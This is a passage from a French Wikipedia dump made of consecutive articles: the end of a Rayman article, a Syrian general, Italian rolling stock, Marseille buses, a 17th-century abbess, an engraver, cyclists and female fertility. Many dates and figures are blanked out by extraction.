Le magazine ' souligne que, bien qu'il manque d'originalité dans son , il dépasse nombre de jeux de plateformes par sa profondeur et sa jouabilité. ' va plus loin, estimant que le jeu pourrait , le comparant aux films d'animation Disney comme "Blanche-Neige et les Sept Nains". Il le qualifie de titre indispensable pour les possesseurs de consoles de cinquième génération. Plusieurs critiques relèvent le contraste entre la difficulté du jeu et son apparence visuelle innocente. "Sega Saturn Magazine" reproche à la version Saturn son caractère répétitif, avec des niveaux trop similaires ne variant que par leur difficulté ou leurs attaques. Il juge l'expérience , voire par moments. "Game Informer" salue ses visuels mais considère le jeu comme , une difficulté excessive nuisant à sa mémorabilité. GameSpot note que .
Les avis sur les graphismes de ' divergent parmi les critiques. compare le jeu à "Donkey Kong Country" ou "Pitfall!", soulignant ses éléments de jeu ingénieux, ses personnages attachants et humoristiques, sa musique excellente et son ton fantaisiste. Cependant, il reproche au jeu son manque de points de sauvegarde fréquents. ' estime que ' comble les attentes des joueurs sur Sega Saturn, le jugeant supérieur à des jeux de plateformes comme "Bug!" ou "Astal". Il relève que si l'esthétique et la musique paraissent enfantines, la difficulté s'adresse aux joueurs expérimentés. Il vante les visuels luxuriants et impeccables, avec une mention spéciale pour les effets de transition entre niveaux. ' salue l'optimisation technique, la variété des défis et le charme du personnage principal, y voyant une bouffée d'air frais face aux autres jeux PC. Pour la version Jaguar, le magazine estime le jeu irréprochable, mettant en avant sa palette de couleurs étendue, ses effets sonores détaillés et sa jouabilité globale, le qualifiant d'excellent. Jeuxvideo.com loue la version PlayStation en saluant particulièrement les graphismes : 
' est adapté sur Game Boy Color début 2000, puis sur Palm OS en , sur Nintendo DSi en , et enfin sur iOS en . La version fait partie des jeux Ubisoft utilisant la fonctionnalité permettant aux joueurs d'échanger des données entre jeux via le port infrarouge de la console pour débloquer du contenu supplémentaire. ', une adaptation pour Game Boy Advance développée par Digital Eclipse, sort en . "Next Generation" souligne que le jeu reste très fidèle à l’original et salue ses graphismes, sa musique et ses contrôles. Martin Taylor, journaliste chez Eurogamer, le qualifie de . Le jeu fait également partie des vingt titres préinstallés sur la PlayStation Classic, une réplique miniature de la PlayStation sortie en .
Ventes.
' connaît un succès commercial retentissant. Fin 1995, le jeu s'écoule à en Europe. Les ventes mondiales atteignent en 1997. Il devient le jeu PlayStation le plus vendu de tous les temps au Royaume-Uni, tandis qu'en France, avec écoulés d'ici 2000, il se classe deuxième des meilleures ventes sur la plateforme. Aux États-Unis, les ventes totalisent . Selon Gamasutra, la version ' approche les vendues lors du premier semestre de l'exercice 2001-2002, puis atteint à fin .
En 2005, ' se classe précédant ' et "Gran Turismo" à la deuxième et troisième places respectivement.
Postérité.
' connaît un succès commercial qui lance une franchise à succès, avec plusieurs suites comme ' (1999) et ' (2003), et certains éléments du jeu influencent plus tard '. Il s'agit du premier jeu d’Ubisoft à rencontrer un succès considérable, permettant à l’entreprise d’entrer en bourse en 1996. En 2006, Michel Ancel est décoré par le gouvernement français pour son travail. Après la sortie du jeu, le personnage de Rayman devient une figure emblématique du jeu vidéo, conservant sa popularité malgré le passage aux consoles de nouvelle génération. Il est même un temps envisagé comme mascotte potentielle de la Jaguar.
Rémi Gazel, compositeur de la bande-son de ', a envisagé de transformer la musique du jeu en un spectacle "live" intitulé '. Ce projet ne voit jamais le jour, Gazel décédant d’un cancer en avant de pouvoir le concrétiser.
', un ' amateur réalisé par le développeur finlandais Ryemanni, propose des mondes, niveaux et mini-jeux supplémentaires. Sorti gratuitement sur Game Jolt pour le de ', il est salué par la critique. ' et Kotaku remarquent notamment qu'en plus du mode de difficulté du jeu d'origine, calibré pour les joueurs aguerris, le jeu inclut un mode de difficulté réduite adapté aux joueurs occasionnels, une aubaine pour ceux qui furent par la difficulté du jeu original. Kotaku vante également son contenu enrichi. Stuart Gipp, du podcast ', juge le remake impressionnant comparé à ' ou "Sonic Mania". Il applaudit les efforts pour corriger les défauts du jeu original, tout en regrettant l’atténuation de certains traits qui forgeaient son identité.

</doc>
<doc id="3214543" url="https://fr.wikipedia.org/wiki?curid=3214543" title="Mohammed Sleiman">
Mohammed Sleiman

Mohammed Sleiman (Suleiman), né en 1959 et mort à Dreikiche le à Tartous, est un général et un homme politique syrien.
Proche conseiller du président Bachar el-Assad, il avait en charge la sécurité présidentielle et les relations avec le Hezbollah.
Il est mort, assassiné, le près de Tartous par un sniper, alors qu'il se trouvait dans sa résidence secondaire. Étant donné le mode opératoire, des soupçons ont été portés sur les Israéliens, ce que ces derniers ont démenti.
Le , le site web The Intercept dévoile un extrait d’Intellipedia (une base de données interne à la NSA) fourni par Edward Snowden indiquant que l’assassinat a été commis par des commandos de marine israéliens. Cet assassinat est le premier exemple connu d’une attaque d’Israël contre « "un responsable d’un gouvernement légitime" », ajoute le document de la NSA. Selon "The Intercept", la NSA a établi la responsabilité d’Israël dans la mort du général par l’interception de communications israéliennes. Le gouvernement israélien avait nié son implication dans cet assassinat, mais le quotidien américain "The Washington Post" avait confirmé en l’implication du Mossad et de la CIA, en citant des sources anonymes du renseignement américain.

</doc>
<doc id="3214548" url="https://fr.wikipedia.org/wiki?curid=3214548" title="Good Bye, Dragon Inn">
Good Bye, Dragon Inn



</doc>
<doc id="3214549" url="https://fr.wikipedia.org/wiki?curid=3214549" title="SC Sélestat handball">
SC Sélestat handball



</doc>
<doc id="3214550" url="https://fr.wikipedia.org/wiki?curid=3214550" title="Good Riddance (Time Of Your Life)">
Good Riddance (Time Of Your Life)



</doc>
<doc id="3214557" url="https://fr.wikipedia.org/wiki?curid=3214557" title="Polača (Zadar)">
Polača (Zadar)

Polača est un village et une municipalité située dans le comitat de Zadar, en Croatie. Au recensement de 2001, la municipalité comptait habitants, dont 93,72 % de Croates et le village seul comptait habitants.
Localités.
La municipalité de Polača compte 4 localités :

</doc>
<doc id="3214562" url="https://fr.wikipedia.org/wiki?curid=3214562" title="Liste de matériel roulant ferroviaire italien">
Liste de matériel roulant ferroviaire italien

La liste ci-dessous est une liste la plus exhaustive possible des moyens de traction connus qui ont circulé et/ou qui circulent actuellement sur le réseau ferré italien, réseau public national, privé ou en concession. 
Particularité du matériel roulant italien des Ferrovie dello Stato.
Contrairement à beaucoup d'autres compagnies de chemin de fer, depuis leur création, les Ferrovie dello Stato (FS) ont disposé d'un bureau d'études assurant la conception et le développement de tout le matériel roulant utilisé en Italie. Les constructeurs n'étaient en fait que des sous-traitants, fabriquant le matériel conçu par les FS, à de très rares exceptions près. Les FS maintiendront cette spécificité jusqu'à la création, sous obligation de la Commission Européenne dans les années 2000, de la division Trenitalia qui fera comme toutes ses concurrentes, définissant seulement le cahier des charges pour les appels d'offres de nouvelles fournitures.
Locomotives à vapeur.
Écartement normal.
Entre le et la première moitié du en Italie le trafic n'était quasiment assuré que par des machines à vapeur. Beaucoup de locomotives à vapeur, rachetées par la nouvelle société FS - Ferrovie dello Stato lors de la nationalisation des chemins de fer, ont été renommées selon la codification en vigueur dans les FS.
Écartement réduit.
De type particulier, avec utilisation dédiée sur des lignes particulières.
Locomotives Diesel.
Écartement standard.
Depuis le milieu du les locomotives diesel sont devenues courantes sur le réseau italien, notamment sur les lignes non électrifiées. La plupart sont utilisées pour les manœuvres.
Écartement réduit.
Ces locomotives sont plutôt rares mais quelques unités ont été utilisées très localement dans des activités de manœuvres délicates.
Locomotives électriques.
L'Italie a la particularité d'avoir un des réseaux électrifiés les plus importants du monde et d'avoir commencé l'électrification dès 1920.
Électrification 3,6 kV - 16,7 Hz - triphasé.
Au tout début du , aux balbutiements de l'histoire ferroviaire italienne, le système de traction triphasé fut expérimenté et les premières locomotives électriques ont été équipées ainsi. Le système a rapidement été remplacé par le 3 kV courant continu, encore en vigueur sur le réseau italien normal, les lignes LGV étant en 25 kV alternatif.
Électrification en 10 kV - courant alternatif fréquence industrielle 50 Hz.
En 1927, de manière expérimentale, un système avec alimentation 10 kV fut introduit sur la ligne Rome-Sulmona. Cet essai n'eut pas de suite et la ligne sera convertie au classique 3 kV CC en 1950.
Électrification en 650 V courant continu et troisième rail.
Ce système sera expérimenté sur la ligne Milan-Porto Ceresio et reconverti en 3 kV CC en 1951.
Sur cette ligne circulaient également des automotrices "lourdes" des FS, qui seront transformées pour circuler sous 3 kV CC avec pantographe.
Électrification en 3 kV courant continu.
L'électrification sous 3 kV en courant continu est devenue, à partir de 1930, le standard sur tout le réseau italien. Ces locomotives représentent la base du service commercial des FS et nombreuses sont les motrices qui composent encore de nos jours le parc roulant italien.
Électrification sous 25 kV alternatif 50Hz (monophasé).
Locomotives expérimentales pour le réseau de la Sardaigne.
Rames électriques.
L'Italie a été longtemps à l'avant-garde dans le domaine de la grande vitesse ferroviaire. Depuis les années 1930, les convois italiens faisaient l'admiration du monde ferroviaire pour les vitesses atteintes et la sécurité des trains construits par l'industrie italienne. 
Rames Automotrices.
Courant alternatif triphasé.
Au tout début des années 1900 des rames automotrices furent construites pour circuler sur le réseau spécifique de la Valtellina, au Nord de Milan vers la frontière Suisse.
Rames ALe - Automotrices Légères électriques.
Les convois de rames automotrices électriques standard (3 kV CC) ont assuré la plus grande partie du trafic local italien.
Rames Automotrices essence.
Les premières rames étaient équipées de moteurs essence qui seront rapidement abandonnées au profit des rames diesel ("nafta" en italien).
Autorails diesel ("nafta").
La flotte des rames automotrices diesel est la base du transport local italien.
Rames Automotrices avec alimentation expérimentale.
Convois et véhicules automoteurs avec alimentation expérimentale.
Construites à partir de 1950.
Rames hybrides.
Rames bi-modes.
Les rames dites bi-modes peuvent circuler sur des lignes électrifiées par caténaire ou de manière autonome à l'aide de générateurs composés de moteurs thermiques.
Rames tri-modes.
Les rames dites bi-modes peuvent circuler sur des lignes électrifiées par caténaire ou de manière autonome à l'aide de générateurs composés de moteurs thermiques ou de batteries.
Locomotives de manœuvre.
Électriques.
Motrices de manœuvre électriques, avec cabines ou chariot moteur à accoupler
Voitures.
Voitures passagers.
Liste partielle des voitures actuellement en service 

</doc>
<doc id="3214563" url="https://fr.wikipedia.org/wiki?curid=3214563" title="Polaca">
Polaca



</doc>
<doc id="3214565" url="https://fr.wikipedia.org/wiki?curid=3214565" title="Goro Yamaguchi">
Goro Yamaguchi



</doc>
<doc id="3214569" url="https://fr.wikipedia.org/wiki?curid=3214569" title="Snorri Steinn Guðjónsson">
Snorri Steinn Guðjónsson

Snorri Steinn Guðjónsson, né le à Reykjavik, est un handballeur islandais, évoluant au poste de demi-centre. Avec l'équipe nationale d'Islande, il est notamment vice-champion olympique en 2008.
Il est actuellement le sélectionneur de l'équipe nationale d'Islande. 
Biographie.
Guðjónsson commence le handball à l'âge de six ans et joue jusqu'à ses 21 ans avec le club islandais du Valur Reykjavík. Il rejoint en 2003 le TV Großwallstadt, club de Bundesligisten.
Deux ans plus tard, il signe au GWD Minden où il reste également deux ans. En 2007, il signe pour le club danois du GO Gudme Svendborg TGI.
En , Guðjónsson rejoint Rhein-Neckar Löwen. Après une saison, il rejoint le club danois du AG Copenhague.
À la suite de la banqueroute du club de la capitale danoise, il retrouve son ancien club, le GO Gudme Svendborg TGI, alors en . Lors de sa première saison, il aide le club danois à retrouver l'élite puis à s'y maintenir.
Le , il signe au Sélestat AHB pour un contrat de 2 ans.
En , sa venue à l'USAM Nîmes Gard est officialisée, avec un contrat de 3 ans. Cela lui permettra de rejoindre son compatriote Ásgeir Örn Hallgrímsson arrivé de Paris la saison précédente. En 2017, il quitte finalement l'USAM Nimes et rentre au pays où il joue pour le Valur Reykjavik.
Équipe nationale.
"Au "

</doc>
<doc id="3214570" url="https://fr.wikipedia.org/wiki?curid=3214570" title="Snorri Guðjónsson">
Snorri Guðjónsson



</doc>
<doc id="3214571" url="https://fr.wikipedia.org/wiki?curid=3214571" title="Quai Sud Télévisions">
Quai Sud Télévisions

Quai Sud Télévisions est une société de production de télévision française créée en 1996 par l'animateur de radio et de télévision Julien Courbet, dirigé par Édouard Boccon-Gibod et appartenant à TF1 depuis 2005. Le janvier 2009, La société fusionne avec les autres boites de production appartenant a TF1 (GLEM, Yagan Productions, Alma Productions, TAP – Tout Audiovisuel Production, TF1 Publicité Production) pour former TF1 Production.
"Quai Sud Télévisions" produisait "Sans aucun doute" et "Confessions intimes".

</doc>
<doc id="3214572" url="https://fr.wikipedia.org/wiki?curid=3214572" title="Autobus de Marseille">
Autobus de Marseille

Le réseau d'autobus de Marseille couvre la commune de Marseille ainsi que les communes voisines d'Allauch, Plan-de-Cuques et Septèmes-les-Vallons.
Il compte une centaine de lignes exploitées par la RTM fonctionnant de à (sauf certaines qui circulent de 4 h à 1 h du matin). À partir de , une douzaine de lignes de soirée (réseau « Fluobus ») prennent le relais jusqu'à 1 h du matin puis deux de nuit en fin de semaine (réseau « Noctambus ») de 1 h à 4 h du matin.
Réseau RTM.
Numérotation.
Le réseau de bus géré par la RTM est doté d'une numérotation héritée de l'ancien réseau de tramway de la ville qui était disposé en étoile à partir du centre-ville (la ligne 1 partant vers Allauch, la 2 vers Plan-de-Cuques). Les barres des numéros des services intermittents de tramway ont été remplacées par des lignes de bus à numéros barrés puis par des « B » (exemple : 4, 4B). Ainsi :
Auparavant, 49A et 49B différenciaient le sens de circulation d'une même ligne circulaire (aujourd'hui remplacée par la ligne 49) alors que 41S et 41N remplaçaient une ancienne ligne 41 coupée en deux (devenues aujourd'hui 41 et 42). Une ligne exploitée durant l'année 2013 a porté un nom : la « "City navette" ».
Les lignes historiques du réseau de nuit « Fluobus » sont numérotées 5xx, exceptée la ligne 59.
Une restructuration complète du réseau de bus est à l’étude pour l’horizon 2025.
Lignes urbaines.
Bus à haut niveau de service.
Depuis le , la RTM exploite des lignes de bus à haut niveau de service (BHNS) dénommées « Très Grands Bus » ou « lebus+ ». Elles sont desservies par des autobus articulés circulant au moins en partie en site propre :
Depuis le , des autobus articulés circulent également sur les lignes 19 (en période estivale uniquement), 35, 70 et 98 (uniquement le samedi). Ils ont circulé sur les lignes 82 et 82S jusqu'au 28 septembre 2015, date de début des travaux du quai de Rive Neuve, depuis ils circulent en standard électrique. Ils ont également circulé sur la ligne 38 du au , date à laquelle la nouvelle ligne B4 est mise en service.
Lignes scolaires.
Il s’agit de lignes principalement dédiées au ramassage scolaire fonctionnant du lundi au vendredi aux heures d’entrées et de sorties durant les périodes scolaires.
Jusqu’en 2021, ces lignes furent des déclinaisons des principales lignes desservant les établissements scolaires et se terminaient avec l’indice "A", "-1A" ou "-4A" (exemple : 83A, 83-1A et 83-4A pour la ligne 83). Depuis la rentrée 2021, elles sont devenues indépendantes et renommées en "Sx" car la lettre S signifie scolaire.
Les lignes de bus des collines BC4 et BC5 échappent à cette règle en ayant remplacé en 2020 les lignes 142A et 143A respectivement. Dès la rentrée 2022 est venue, en plus d’une refonte des itinéraires de ces deux mêmes lignes, s’ajouter la création d’une ligne BC6. Dès le 7 juillet 2025, ces trois lignes sont supprimées et remplacées par les lignes 1100, 1200 et 1300 au départ et en direction des principaux établissements scolaires des communes d’Allauch et de Plan-de-Cuques.
Plus de détails sur le site de la RTM : renforts des lignes de bus en périodes scolaires.
Ligne « Spécial MDM ».
En 2019, Marsactu révèle l'existence d'une ligne de bus « Spécial MDM », reliant la place Castellane à la Madrague de Montredon sans desservir les plages, et dont le trajet et les horaires ne sont pas diffusés par la RTM. L'opposition y voit une preuve de clientélisme. Marsactu retrace l'histoire de cette ligne créée sous la mandature de Jean-Claude Gaudin à la communauté urbaine, et initialement surnommée ; à partir de 2008, elle a sa fiche horaire, mais celle ci n'est divulguée qu'aux comités d'intérêt de quartier. La ligne n’est plus active à l’été 2020.
Fluobus.
Présentation.
Le premier service « théâtres et de nuit » par autobus débute en 1949, en remplacement des lignes de tramway d'alors, et perdure après 1960 et la disparition du tramway. Avant la mise en service de la première ligne de métro, 28 lignes de bus desservent Marseille de 21 h à 0 h 30, puis 30 lignes à partir de 1980.
En , la RTM réorganise le réseau de nuit autour de treize lignes dont la majeure partie ont un départ simultané au Centre Bourse. Ces lignes sont numérotés avec des lettres (A, B, C, D, E, H, K, L, N, R, T, auxquelles s'ajoutent les lignes 1/11 et 40), inscrites en lettres orange sur fond noir sur les bandeaux des autobus.
Le climat d'insécurité dans le métro pousse la RTM à le fermer à 21 h et à le remplacer, ainsi que le par un réseau de bus en soirée, « Fluobus ». Puis, en 1994, l'ensemble du réseau de bus de nuit est réorganisé et placé sous la bannière « Fluobus ». Les lignes sont toujours numérotées par des lettres, mais en vert sur fond noir.
Puis, en 1997, le réseau « Fluobus » est de nouveau réorganisé autour de onze lignes numérotées en 5-- excepté une ligne, la suburbaine 142 (devenue 145 en 2009) qui, étant créée en 1994, est intégrée à ce nouveau réseau en desservant les communes d’Allauch et Plan-de-Cuques. S’est ajoutée le 7 janvier 2013 la ligne 582 qui dessert exclusivement le centre-ville. Le 1 septembre 2014 à la suite de l’arrivée des lignes à haut niveau de service, une nouvelle ligne nommée B3 est créée en remplacement de la ligne 541. Le 1 juin 2024, les autres lignes de BHNS (B1 et B2) ainsi que les lignes 19, 20, 23, 72 et 83 fonctionnant déjà en journée intègrent le réseau en remplacement des lignes 521, 526 et 583 et une nouvelle ligne à la demande est créée : la ligne 59. Le 2 juin 2025, la ligne 97 intègre également ce réseau ainsi que la ligne 144 dès le 7 juillet suivant en remplacement de la ligne 145. Le , c’est au tour de la ligne de BHNS B4 nouvellement créée de s’ajouter au réseau, ce qui modifie le tracé de la ligne B3 qui, elle, fonctionne désormais en journée comme en soirée.
Lignes exclusivement de soirée.
Ces lignes listées ci-dessous circulent exclusivement en soirée.
Noctambus.
Présentation.
Après avoir restructuré le réseau de soirée en début d’été 2024, la RTM choisit au mois de septembre suivant de lancer un nouveau réseau de bus entièrement nocturne appelé "Noctambus" constitué de deux lignes avec un départ toutes les heures fonctionnant les nuits du jeudi au vendredi, du vendredi au samedi et du samedi au dimanche après le service des lignes de soirée et avant le service des lignes de journée. Elles relient principalement le centre-ville à des résidences universitaires.
Autres réseaux.
Marseille est également desservie par des lignes Transmétropole du territoire Marseille-Provence de la métropole d'Aix-Marseille-Provence et par le réseau Salon Etang Côte Bleue :
Par ailleurs, les lignes 6, 10 et 14 des transports en commun d'Aubagne et la ligne 1 de Salon Etang Côte Bleue traversent le territoire de la commune de Marseille, ainsi que les lignes A1, 33, 34, 36, 48, 49, 50, 51, 64, 78, 79, 88, 89, 100, 102 et 240 du réseau métropolitain lecar. Les lignes 51, 78 et 240 peuvent être empruntées avec un titre "lacarte" pour les arrêts situés à Marseille.
Matériel roulant.
Au , le parc d'autobus de la RTM est composé de 625 véhicules dont 93 bus articulés, 446 bus standards, 75 midibus et 11 minibus. Au sein de cette flotte, 21 bus fonctionnent à l'électrique et les autres véhicules sont équipés de hybride Diesel-électrique et les autres véhicules sont équipés de moteurs Diesel.
À cela s’ajoutent des véhicules appartenant à des sous-traitants les exploitant pour le compte de la RTM ("Azur Évasion ", "SUMA").
Réseau de bus 2025.
La refonte totale du réseau de bus est à l'étude, pour une mise en service en 2025. Une concertation publique a lieu du au . Le plan définitif sera mis en ligne courant , puis les travaux d'aménagement des routes, pôle d'échange, arrêt de bus commenceront d'ici fin 2023. La création des nouveaux plans et horaire commenceront aussi des à présent. Quand la mise en service se fera progressivement. Seul le réseau de nuit actuel prendra fin de façon progressive notamment et le nouveau de façon progressive aussi dès le .
Le réseau s'articulera autour de :

</doc>
<doc id="3214577" url="https://fr.wikipedia.org/wiki?curid=3214577" title="Bong Jung-Keun">
Bong Jung-Keun



</doc>
<doc id="3214582" url="https://fr.wikipedia.org/wiki?curid=3214582" title="Planification des rapports sexuels">
Planification des rapports sexuels



</doc>
<doc id="3214585" url="https://fr.wikipedia.org/wiki?curid=3214585" title="Planifier les rapports">
Planifier les rapports



</doc>
<doc id="3214587" url="https://fr.wikipedia.org/wiki?curid=3214587" title="Immarmont">
Immarmont



</doc>
<doc id="3214589" url="https://fr.wikipedia.org/wiki?curid=3214589" title="Daniil Komkov (cyclisme, 1985)">
Daniil Komkov (cyclisme, 1985)

Daniil Komkov (né le ) est un coureur cycliste russe.

</doc>
<doc id="3214591" url="https://fr.wikipedia.org/wiki?curid=3214591" title="Marie de Beauvilliers">
Marie de Beauvilliers

Marie-Catherine de Beauvilliers est une religieuse française née le à La Ferté-Hubert et morte le à Montmartre.
Biographie.
Marie Catherine de Beauvilliers est la fille de Claude II de Beauvilliers (1542-1583), comte de Saint-Aignan, gouverneur général du Berry et de l'Anjou à sa naissance, baron de La Ferté-Hubert, de La Salle-lès-Cléry et de Lussay, gouverneur de Bourges, et de son épouse Marie Babou de La Bourdaisière, fille d'honneur de Mary Stuart en 1560, fille de Jean II, comte de Sagonne et Grand maître de l'artillerie, et de Françoise Robertot, dame d'Alluyes,
Marie-Catherine de Beauvilliers fut comme ses deux sœurs, placée très jeune dans un couvent. Elle prend l'habit monastique en 1586 à l'abbaye Notre-Dame de Beaumont-lès-Tours dirigée par Anne Babou de la Bourdaisière, une de ses tantes. Elle fut nommée par Henri IV en 1598, abbesse de Montmartre, qu'avait avant elle, de 1589 à 1594, gouvernée sa sœur Claude, qui y avait en mai 1590, lors du siège de Paris, accueilli le roi de France Henri IV et était brièvement devenue sa maîtresse.
Contrairement à sa sœur Claude, l'abbesse Marie s'appliquera avec le plus grand soin à toutes les prescriptions de la règle, marquant un grand amour de la solitude et de la lecture, tout en acceptant d’être employée à tous les travaux du couvent, même les plus pénibles. Sur les instances de son beau-frère, , elle avait accepté son brevet de nomination à l’abbaye de Montmartre, alors en pleine décrépitude, où elle entra le , accueillie par 33 religieuses déterminées à continuer de vivre à leur guise et s’opposer à toute réforme, sauf deux dont elle fera plus tard sa prieure et sa maîtresse des novices. Encouragée notamment par François de Sales, elle parvint pourtant rapidement à implanter la réforme dans sa maison et manifesta des talents d’administration remarquables, tant pour le spirituel que pour le temporel, puisque 227 religieuses firent profession entre ses mains, que 40 s’en allèrent de Montmartre réformer d’autres maisons et qu’elle laissa puissante et riche une communauté qu’elle avait trouvée à demi ruinée dans des bâtiments en piteux état.
Nommée coadjutrice de sa tante à Beaumont en 1608, elle dut, après le décès de cette dernière, s’y rendre à contre-cœur en , mais n’occupa la charge que six mois avant de se démettre en faveur de sa nièce Anne Babou de la Bourdaisière, qu’elle amena avec elle à Montmartre pour l’instruire de toutes ses obligations. La réforme étant solidement établie dans l’abbaye, elle en fit imprimer les Constitutions, afin que les novices fussent informées des règles sous lesquelles elles s’engageaient à vivre.
En 1620, monseigneur Guillaume Le Gouverneur (1572-1630), évêque de Saint-Malo (1610-1630) fit appel à Marie-Catherine de Beauvilliers pour lui dépêcher deux religieuses afin de prendre la direction du monastère Notre-Dame-de-la-Victoire dont il venait d'autoriser la fondation en 1615, près de sa cathédrale par Servianne Le Gobien, dame du Ponthay, Françoise Porée, Jeanne Gaultier et Perrine Groult. Celle-ci lui dépêcha Renée de Vassay, prieure et Catherine Mesmin
En 1629-1630, elle soutient un procès en Parlement de Paris contre l'archevêque Jean-François de Gondi (1584-1654) au sujet de ses droits sur le prieuré Notre-Dame-de-Grâce de la Ville l'Évêque.
Après avoir gouverné sa maison près de 60 années durant, mais retirée des soucis de l’administration depuis 1644, elle meurt le .

</doc>
<doc id="3214594" url="https://fr.wikipedia.org/wiki?curid=3214594" title="Philippe Thomassin">
Philippe Thomassin

Philippe Thomassin, né à Troyes le et mort à Rome le , est un graveur buriniste français établi à Rome en 1585.
Il est le premier maître de Jacques Callot, qui apprend le métier de graveur dans l'atelier de Thomassin à son arrivée à Rome en 1609, à l'âge de .
Biographie.
Les premières années.
On sait assez peu de choses de Philippe Thomassin ; en dehors de ce qu'on connaît de lui au travers de la biographie de Callot, les sources sont rares.
Philippe Thomassin naquit à Troyes le ; il était l'un des douze enfants qu'eurent Jehan Thomassin, « ceinturier », et Nicole Aubry, son épouse.
Au sortir de l'école primaire, il fut tout d'abord apprenti orfèvre à Troyes, vers 1577. Il reprit tout d'abord un métier similaire à celui de son père, ciselant des boucles et des ornements de ceinturons, fort en vogue dans la deuxième moitié du . Mais il abandonna vite ce métier, qui ne lui permettait pas de gagner sa vie de façon satisfaisante, pour perfectionner son talent de buriniste.
Graveur à Rome.
Les débuts.
Orphelin, après la mort de sa mère en 1574, puis de son père, au cours de l'épidémie de peste survenue à Troyes au cours de l'année 1582, il arriva à Rome en 1585, sans aucune ressource. Il travailla alors brièvement pour l'éditeur de gravure Claude Duchet. Malheureusement, celui-ci devait mourir prématurément avant la fin de l'année 1585.
Philippe Thomassin fut alors embauché pour un temps par Antonio Tempesta au cours de l'année 1586.
Dans les années qui suivirent, il eut l'occasion de réaliser des œuvres importantes, par exemple le portrait d'un capucin très populaire, le frère Félix de Cantalice, mort à Rome, le . La même année, il reçut commande d'une série d'illustrations des nouveaux statuts de l'ordre de Saint-Jean de Jérusalem, comportant de grands maîtres de l'Ordre.
L'association avec Jean Turpin.
En 1588, il s'associa avec son beau-frère, le peintre Jean Turpin, qui avait épousé la sœur de sa femme. Philippe Thomassin était chargé de la partie artistique et du tirage des gravures, cependant que Jean Turpin s'occupait de la commercialisation. Thomassin commença alors à graver des sujets religieux, dont il se faisait un grand commerce à Rome, gravant des reproductions de peintures d'artistes italiens tels que Federico Barocci (« Frédéric Baroche »), Antonio Tempesta et Francesco Vanni, ainsi que d'artistes français comme Martin Fréminet, dont il grava de nombreuses œuvres, jusqu'au départ de celui-ci de Rome, en 1602 (une « Annonciation », une « Flagellation », ou encore un « Saint-Sébastien », ou encore un « Baptême de Jésus », par exemple) ; il copia également des artistes flamands (Johan Sadeler, Sébastien Vrancx, etc.).
En 1590, à la suite de la gravure d'un portrait du roi (encore protestant), il se trouve confronté à de sérieux problèmes avec l'Inquisition, et passe quelques jours au cachot, au mois de .
Après l'association avec Turpin.
Au début de l'année 1602, à la suite de la mort de sa femme Barbara l'année précédente, il mit fin à son association avec Jean Turpin, lui abandonnant ses planches gravées, soit quelque 240 cuivres (Turpin fera effacer le nom de Philippe Thomassin).
Tout au long de sa carrière, pendant comme après son association avec Jean Turpin, Philippe Thomassin – conformément à la pratique de l'époque – copiait librement des œuvres d'autres graveurs, ou encore de peintres, et achetait les cuivres d'autres graveurs, dont il n'hésitait pas à modifier à la fois le sujet et la signature, bref, faisait commerce d'images sans se préoccuper de ce qu’on appellerait aujourd'hui les droits d'auteurs.
Après la fin de son association avec Jean Turpin, il poursuivit sa carrière de graveur, gravant par exemple des œuvres de Claude Déruet (« Saint François de Paule », « Jésus condamné », etc.) et, en 1609, prit comme apprenti le tout jeune Jacques Callot, dont il sera le premier maître. Il grava encore de nombreuses œuvres, presque toutes religieuses (car il fallait l'accord de la censure pour éditer des gravures profanes), telles que « Jésus et les douze apôtres » d'après Raphaël, en 1621.
Philippe Thomassin mourut à Rome après une longue carrière, le . Son arrière-petit-neveu Simon Thomassin fut graveur, comme lui.
Relation avec Jacques Callot.
Au-delà d'un certain nombre de belles pièces qu'exécuta Philippe Thomassin au cours de sa carrière, il produisait également des gravures purement commerciales, pour lesquelles il faisait travailler des graveurs débutants payés à la journée ; il s'agissait bien souvent de copies bon marché d'œuvres connues. Ce furent là les premiers travaux dont il chargea Jacques Callot, lorsque celui-ci vint travailler chez lui, du début de 1609 à la fin de 1611.
C'est à cette date que Callot quitta Philippe Thomassin, celui-ci étant, selon Félibien, jaloux de « la familiarité, peut-être trop grande, que Callot, alors jeune et bien fait, avait avec sa femme. » Jacques Callot partit alors travailler à Florence, chez Giulio Parigi.

</doc>
<doc id="3214599" url="https://fr.wikipedia.org/wiki?curid=3214599" title="Roman Klimov">
Roman Klimov

Roman Guennadievitch Klimov, né le , est un coureur cycliste russe.

</doc>
<doc id="3214601" url="https://fr.wikipedia.org/wiki?curid=3214601" title="Chrysomèle de la menthe">
Chrysomèle de la menthe



</doc>
<doc id="3214603" url="https://fr.wikipedia.org/wiki?curid=3214603" title="Georges Thomas (football)">
Georges Thomas (football)

Georges Thomas est un footballeur français né le à Saint-Martin-Boulogne (Pas-de-Calais) et mort le à Cannes. Il réalise sa carrière essentiellement à Monaco, comme défenseur. Avec l'équipe de la principauté, il remporte deux championnats et deux Coupes de France.

</doc>
<doc id="3214605" url="https://fr.wikipedia.org/wiki?curid=3214605" title="Grande ville">
Grande ville



</doc>
<doc id="3214606" url="https://fr.wikipedia.org/wiki?curid=3214606" title="Emblème national">
Emblème national



</doc>
<doc id="3214607" url="https://fr.wikipedia.org/wiki?curid=3214607" title="Alexey Kunshin">
Alexey Kunshin

Alexey Kunshin (né le ) est un coureur cycliste russe. Membre de l'équipe russe Katyusha en 2008, il est contrôlé positif à l'acétazolamide lors du prologue du GP Tell qu'il remporte en août. Il en est déclassé et est suspendu pour deux ans à compter du .

</doc>
<doc id="3214609" url="https://fr.wikipedia.org/wiki?curid=3214609" title="Stretching (sport)">
Stretching (sport)



</doc>
<doc id="3214615" url="https://fr.wikipedia.org/wiki?curid=3214615" title="Fertilité féminine">
Fertilité féminine

La fertilité féminine est liée aux cycles d'ovulation de la femme. La période pendant laquelle un rapport peut être fécondant, appelée période fertile ou fenêtre de fertilité, dure de 5 à 8 jours selon les couples. Elle correspond aux quelques jours par mois où un couple humain a des chances de concevoir un enfant. Pendant le reste de son cycle, la femme est dite « non fertile ». La fertilité féminine, comme la fertilité masculine (en raison notamment d'un phénomène de délétion de la spermatogenèse) est en déclin dans le monde, pour des raisons en partie encore mal comprises ; en France 10 à 20 % des couples en âge de procréer sont infertiles.
Durée de la phase fertile.
